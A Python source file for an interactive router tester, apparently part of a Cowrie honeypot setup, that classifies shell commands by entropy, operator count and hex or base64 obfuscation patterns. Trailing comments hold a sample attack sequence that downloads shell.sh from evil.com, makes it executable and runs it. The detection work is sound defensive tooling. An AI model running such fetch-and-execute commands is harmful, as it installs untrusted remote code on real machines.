from router import classify, _entropy, _is_cloud

COLORS = {
    'cowrie':    '\033[94m',   # blue
    'on_device': '\033[92m',   # green
    'cloud':     '\033[93m',   # yellow
}
RESET = '\033[0m'

def explain(cmd: str, session: list) -> str:
    from router import _matches, BASIC_PATTERNS, ONDEVICE_PATTERNS, _is_cloud
    import re

    # ── cloud first ──────────────────────────────────────────────
    if _is_cloud(cmd):
        e = _entropy(cmd)
        op_count = 0
        op_count += cmd.count('&&')
        op_count += cmd.count('||')
        op_count += cmd.count('>>')
        op_count += len(re.findall(r'(?<!>)>(?!>)', cmd))
        op_count += len(re.findall(r'\|(?!\|)', cmd))
        op_count += cmd.count(';')
        op_count += cmd.count('<')

        reasons = []
        if e > 4.8 and len(cmd) >= 90:
            reasons.append(f"entropy={e:.2f} > 4.8 AND length={len(cmd)} >= 90")
        if op_count >= 2:
            reasons.append(f"operator count={op_count} >= 2")
        if re.search(r'(\\x[0-9a-fA-F]{2}){6,}', cmd):
            reasons.append("hex escape detected")
        if re.search(r'[A-Za-z0-9+/]{40,}={0,2}', cmd):
            reasons.append("base64 pattern detected")
        return " + ".join(reasons) if reasons else "cloud condition met"

    # ── then patterns ─────────────────────────────────────────────
    if _matches(cmd, BASIC_PATTERNS):
        return "matched BASIC_PATTERNS"
    if _matches(cmd, ONDEVICE_PATTERNS):
        return "matched ONDEVICE_PATTERNS"
    return "no match → fallback to on_device"

def main():
    session = []
    print("=" * 55)
    print("  Router Tester — type commands to see which agent !!!!\n Don't run this shit to your actual terminal")
    print("=" * 55)
    print("  'history' → show session  |  'clear' → reset  |  'quit' → exit")
    print("=" * 55)

    while True:
        try:
            cmd = input("\n$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nBye!")
            break

        if not cmd: continue
        if cmd == 'quit': break
        if cmd == 'clear':
            session = []
            print("  [session cleared]")
            continue
        if cmd == 'history':
            if not session:
                print("  [empty]")
            for i, e in enumerate(session, 1):
                color = COLORS.get(e['agent'], '')
                print(f"  {i}. {color}[{e['agent']}]{RESET} {e['cmd']}")
            continue

        agent = classify(cmd, session)
        reason = explain(cmd, session)
        color = COLORS.get(agent, '')
        e = _entropy(cmd)

        print(f"  → Agent   : {color}{agent.upper()}{RESET}")
        print(f"  → Reason  : {reason}")
        print(f"  → Entropy : {e:.2f}  |  Length: {len(cmd)}")
        print(f"  → Session : {len(session)} cmd(s)")

        session.append({"cmd": cmd, "agent": agent})

if __name__ == "__main__":
    main()


# wget http://evil.com/shell.sh
# chmod +x shell.sh
# bash shell.sh